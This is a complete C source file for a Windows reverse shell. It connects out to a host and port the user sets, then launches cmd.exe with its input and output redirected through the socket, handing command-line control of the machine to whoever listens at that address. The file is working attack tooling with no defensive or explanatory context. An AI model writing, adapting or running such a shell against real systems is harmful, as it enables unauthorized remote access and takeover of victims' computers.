#include <stdio.h>
#include <winsock.h>
#include <Windows.h>
#include <WinSock2.h>
#include <string.h>
#include <stdlib.h>

#define MAX_BUFFER_SIZE 4096

typedef struct {
	int PORT;
	char* IP;
} IPEndPoint;


int main(int argc, char **argv) {

	IPEndPoint localEndPoint = { 1234, "127.0.0.1" }; // Change this to what you want
	struct sockaddr_in clientInfo;

	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	clientInfo.sin_family = AF_INET;
	clientInfo.sin_port = htons(localEndPoint.PORT);
	clientInfo.sin_addr.s_addr = inet_addr(localEndPoint.IP);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	printf("[!] Connecting...\n");
	
	if (WSAConnect(shell, (struct sockaddr*)&clientInfo, sizeof(clientInfo), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
		printf("[!] Connected\n");

		char buffer[MAX_BUFFER_SIZE];
		memset(buffer, 0, sizeof(buffer));

		recv(shell, buffer, sizeof(buffer), 0);

		memset(&si, 0, sizeof(si));

		si.cb = sizeof(STARTUPINFOA);
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

		printf("[!] Creating process...\n");

		if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
			printf("[!] Failed to create process\n");
		}
		printf("[!] Process successfully created\n");

		WaitForSingleObject(pi.hProcess, INFINITE);

		printf("[!] Exiting\n");

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		memset(buffer, 0, sizeof(buffer));
	}
	else {
		printf("[!] Failed to Connect\n");
	}

	closesocket(shell);
	WSACleanup();

	return 0;
}